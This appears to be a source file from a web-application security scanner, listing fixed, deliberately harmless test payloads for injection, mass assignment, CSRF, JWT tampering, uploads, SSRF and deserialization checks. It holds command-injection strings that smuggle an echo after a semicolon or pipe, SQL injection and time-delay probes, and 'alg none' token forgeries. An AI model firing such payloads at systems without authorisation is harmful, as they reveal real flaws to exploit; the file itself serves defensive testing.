/**
 * yof engagement, open core: THE payload list. Every text a technique of the library can send is written here, once,
 * with an id. Nothing writes a payload at run time: a technique names ids from this list, and a model step (when one
 * exists) may only choose among them.
 *
 * What a payload may be: a harmless marker. It reads nothing but the run's own test record, changes nothing but that
 * record, names no file, no environment variable and no address but the yof canary, and runs nothing but an echo or
 * a sum. A slot in single braces is filled by the technique with a value of the run:
 *
 *   {marker}  the run's planted marker        {token}  a fresh random word of this request
 *   {id}      the id of the run's test record {url}    the yof canary address with this request's token
 *   {n}       a number of seconds or a count  {missing} an id that does not exist, shaped like the real one
 *
 * The arithmetic markers: 1337 * 7331 = 9801547, and 1300 + 37 = 1337. An answer that holds the RESULT and not the
 * payload's own text ran the sum; an answer that holds the payload's text only reflected it.
 */
import { aiProbes, aiProbesY11 } from "../../probes";
import type { Payload } from "./types";

export const SSTI_PRODUCT = "9801547";
export const CMD_ECHO = "yofcmd1337yof";
/** A foreign site, on the reserved .invalid domain: it never resolves, so nothing can be sent to it. */
export const FOREIGN_ORIGIN = "https://example.invalid";
export const TIME_DELAY_SECONDS = 2;
export const WRONG_PASSWORD_TRIES = 8;
export const MAX_PARALLEL = 10;
export const DEFAULT_PARALLEL = 6;

/** The SVG namespace name. It is a name, never requested; assembled so this file holds no address. */
const SVG_NAMESPACE = ["http:", "", "www.w3.org", "2000", "svg"].join("/");

const p = (id: string, family: string, value: string, note: string): Payload => ({ id, family, value, note });

const ACCESS: Payload[] = [
  p("override.x_http_method_override", "method_override", "X-HTTP-Method-Override", "a header that asks the server to treat the request as another method"),
  p("override.x_http_method", "method_override", "X-HTTP-Method", "the same, in the spelling some frameworks read"),
  p("override.x_method_override", "method_override", "X-Method-Override", "the same, in a third spelling"),
  p("ctype.form", "content_type", "application/x-www-form-urlencoded", "the same change sent as a form"),
  p("ctype.text", "content_type", "text/plain", "the same JSON sent as plain text"),
];

/**
 * Fields a member should not be able to set. The value is the JSON to send. An app model may add names; never values.
 * locked_field: rights and trust (a change that sticks is a finding). owner_field: who the record belongs to (sent only
 * when the record already shows the field). value_field: money and state, which some apps let the owner set: a change
 * that sticks is a finding only when the app model says the field is locked, otherwise it needs validation.
 */
const FIELDS: Payload[] = [
  p("field.role", "locked_field", "\"admin\"", "role"), p("field.is_admin", "locked_field", "true", "is_admin"), p("field.isAdmin", "locked_field", "true", "isAdmin"),
  p("field.admin", "locked_field", "true", "admin"), p("field.verified", "locked_field", "true", "verified"), p("field.is_verified", "locked_field", "true", "is_verified"),
  p("field.email_verified", "locked_field", "true", "email_verified"), p("field.approved", "locked_field", "true", "approved"),
  p("field.price", "value_field", "0", "price"), p("field.amount", "value_field", "0", "amount"), p("field.total", "value_field", "0", "total"),
  p("field.credits", "locked_field", "7331", "credits"), p("field.balance", "locked_field", "7331", "balance"), p("field.discount", "value_field", "100", "discount"),
  p("field.plan", "value_field", "\"yof-test-plan\"", "plan"), p("field.status", "value_field", "\"yof-test-status\"", "status"),
  p("field.permissions", "locked_field", "[\"admin\"]", "permissions"),
  p("field.owner_id", "owner_field", "{missing}", "owner_id"), p("field.user_id", "owner_field", "{missing}", "user_id"), p("field.ownerId", "owner_field", "{missing}", "ownerId"),
  p("field.userId", "owner_field", "{missing}", "userId"), p("field.workspace_id", "owner_field", "{missing}", "workspace_id"), p("field.tenant_id", "owner_field", "{missing}", "tenant_id"),
  p("field.org_id", "owner_field", "{missing}", "org_id"),
  p("field.model", "locked_field", "\"yof-test-value\"", "a field name the app model supplies; the value is this fixed text"),
];

const INJECTION: Payload[] = [
  // Boolean pairs that NARROW a search for the run's own marker. The true side still finds the record; the false side cannot.
  p("sqli.and_quote.true", "sql_boolean", "{marker}' AND '1'='1", "true side, single quotes"), p("sqli.and_quote.false", "sql_boolean", "{marker}' AND '1'='2", "false side, single quotes"),
  p("sqli.and_dquote.true", "sql_boolean", "{marker}\" AND \"1\"=\"1", "true side, double quotes"), p("sqli.and_dquote.false", "sql_boolean", "{marker}\" AND \"1\"=\"2", "false side, double quotes"),
  p("sqli.and_comment.true", "sql_boolean", "{marker}' AND 1=1-- ", "true side, the rest commented out"), p("sqli.and_comment.false", "sql_boolean", "{marker}' AND 1=2-- ", "false side, the rest commented out"),
  p("sqli.and_num.true", "sql_boolean", "{id} AND 1=1", "true side, a numeric id"), p("sqli.and_num.false", "sql_boolean", "{id} AND 1=2", "false side, a numeric id"),
  p("nosql.regex.true", "nosql_boolean", "{\"$regex\":\"^{marker}$\"}", "an operator object that matches the marker"), p("nosql.regex.false", "nosql_boolean", "{\"$regex\":\"^{marker}ZZ$\"}", "an operator object that cannot match"),
  p("sqli.err.quote", "sql_error", "{marker}'", "one unbalanced single quote"), p("sqli.err.dquote", "sql_error", "{marker}\"", "one unbalanced double quote"),
  p("sqli.err.paren", "sql_error", "{marker}')", "a quote and a closing bracket"), p("nosql.err.operator", "sql_error", "{\"$yofnone\":1}", "an operator that does not exist"),
  // Time-based: never on production, and only where the record allows timing tests. A wait of {n} seconds, nothing else.
  p("sqli.time.pg", "sql_time", "{marker}' AND (SELECT 1 FROM pg_sleep({n})) IS NOT NULL AND '1'='1", "PostgreSQL"),
  p("sqli.time.mysql", "sql_time", "{marker}' AND SLEEP({n})=0 AND '1'='1", "MySQL and MariaDB"),
  p("sqli.time.mssql", "sql_time", "{marker}'; WAITFOR DELAY '0:0:{n}'-- ", "SQL Server"),
  p("ssti.curly", "template", "yof{{1337*7331}}yof", "double curly brackets"), p("ssti.dollar", "template", "yof${1337*7331}yof", "dollar and curly brackets"),
  p("ssti.erb", "template", "yof<%= 1337*7331 %>yof", "ERB and EJS"), p("ssti.hash", "template", "yof#{1337*7331}yof", "hash and curly brackets"),
  p("ssti.at", "template", "yof@(1337*7331)yof", "Razor"),
  p("xss.tag", "markup", "<yof-x data-m=\"{token}\"></yof-x>", "an unknown element that does nothing, with a unique word"),
  p("xss.break_tag", "markup", "\"><yof-x data-m=\"{token}\"></yof-x>", "the same, after closing an attribute and a tag"),
  p("cmd.semicolon", "command", ";echo yofcmd$((1300+37))yof", "an echo of a sum after a semicolon"), p("cmd.pipe", "command", "|echo yofcmd$((1300+37))yof", "the same after a pipe"),
  p("cmd.subshell", "command", "$(echo yofcmd$((1300+37))yof)", "the same in a subshell"), p("cmd.backtick", "command", "`echo yofcmd$((1300+37))yof`", "the same in backticks"),
];

const CSRF: Payload[] = [
  p("csrf.no_token", "forgery", "", "the request without its anti-forgery token"),
  p("csrf.foreign_origin", "forgery", FOREIGN_ORIGIN, "the request with the Origin and Referer of another site"),
];

const SESSION: Payload[] = [
  p("jwt.alg_none", "token", "none", "the token re-labelled as unsigned, its signature removed"), p("jwt.alg_None", "token", "None", "the same, another spelling"),
  p("jwt.alg_NONE", "token", "NONE", "the same, in capitals"), p("jwt.bad_signature", "token", "yofyofyofyofyofyofyofyofyofyofyofyofyofyofy", "the token with its signature replaced"),
  p("password.wrong", "sign_in", String(WRONG_PASSWORD_TRIES), "this many wrong passwords on the run's own test account, then one right one"),
];

const LOGIC: Payload[] = [
  p("num.negative", "number", "-1", "a negative number"), p("num.zero", "number", "0", "zero"), p("num.above", "number", "{max}+1", "one more than the upper bound"),
  p("num.other", "number", "{current}+7", "a different number, for a value only the server may set"),
  p("order.skip", "order", "", "a later step sent before the step it needs"), p("use.twice", "single_use", "2", "the same single-use request, twice in a row"),
  p("race.parallel", "race", String(DEFAULT_PARALLEL), `the same request this many times at once (never more than ${MAX_PARALLEL})`),
];

const FILES: Payload[] = [
  p("file.html_as_png", "upload", "<!doctype html><title>yof</title><yof-x data-m=\"{marker}\"></yof-x>", "a tiny page with a marker, named .png and declared an image"),
  p("file.html", "upload", "<!doctype html><title>yof</title><yof-x data-m=\"{marker}\"></yof-x>", "the same page, named .html"),
  p("file.svg", "upload", `<svg xmlns="${SVG_NAMESPACE}"><text>{marker}</text></svg>`, "a drawing with a marker and no script, named .svg"),
  p("file.sub_path", "upload", "{marker}", "a text file whose name holds a folder (yof-dir/name.txt); never a name that climbs out of a folder"),
];

const OUTBOUND: Payload[] = [p("ssrf.canary", "fetch", "{url}", "the yof canary address; never a private, loopback or cloud metadata address")];

const DESERIALIZATION: Payload[] = [
  p("deser.java", "object_stream", "rO0ABXQAA3lvZg==", "a Java object stream that holds one harmless text, as base64"),
  p("deser.php", "object_stream", "O:8:\"stdClass\":0:{}", "an empty PHP standard object"),
  p("deser.pickle", "object_stream", "N.", "a Python pickle of the value None"),
  p("deser.yaml_tag", "object_stream", "yof: !!python/name:builtins.str", "a YAML tag that names a harmless built-in type"),
  p("deser.dotnet_type", "type_hint", "{\"$type\":\"System.Object, mscorlib\",\"yof\":\"{token}\"}", "a .NET type hint for a plain object"),
  p("deser.jackson_type", "type_hint", "[\"java.util.ArrayList\",[\"{token}\"]]", "a Jackson type hint for a plain list"),
];
export const DESERIALIZATION_TYPES: Readonly<Record<string, string>> = {
  "deser.java": "application/x-java-serialized-object", "deser.php": "application/vnd.php.serialized", "deser.pickle": "application/python-pickle",
  "deser.yaml_tag": "application/x-yaml", "deser.dotnet_type": "application/json", "deser.jackson_type": "application/json",
};

const CRYPTO: Payload[] = [p("observe.own_values", "observation", "", "nothing is sent: the run's own ids and tokens are looked at")];

/** The assistant probes are the fixed messages of ../../probes.ts; they are listed here by id, with {canary} for the run's word. */
const AI: Payload[] = [...aiProbes("{canary}"), ...aiProbesY11("{canary}")].map((x) => p(`ai.${x.id}`, "assistant", x.message, "a fixed, mild message to the app's own assistant"));

export const PAYLOADS: readonly Payload[] = [...ACCESS, ...FIELDS, ...INJECTION, ...CSRF, ...SESSION, ...LOGIC, ...FILES, ...OUTBOUND, ...DESERIALIZATION, ...CRYPTO, ...AI];
export const PAYLOAD_BY_ID: Readonly<Record<string, Payload>> = Object.fromEntries(PAYLOADS.map((x) => [x.id, x]));

/** A payload by id. An id that is not in the list is a programming error, never a payload made up on the spot. */
export function payload(id: string): Payload {
  const x = PAYLOAD_BY_ID[id];
  if (!x) throw new Error(`Unknown payload id: ${id.slice(0, 60)}`);
  return x;
}
/** Fill the single-brace slots of a payload. A slot without a value is left as it is. */
export const fillPayload = (id: string, slots: Record<string, string> = {}): string =>
  payload(id).value.replace(/\{(marker|token|id|url|n|missing|max|current|canary)\}/g, (m, k: string) => (k in slots ? slots[k]! : m));
/** The payload ids of a family, in list order. */
export const payloadsOf = (family: string): string[] => PAYLOADS.filter((x) => x.family === family).map((x) => x.id);
/** The fixed list of field names a member should not be able to set (the payload notes of the two field families). */
export const LOCKED_FIELD_NAMES: readonly string[] = FIELDS.filter((x) => x.id !== "field.model").map((x) => x.note);
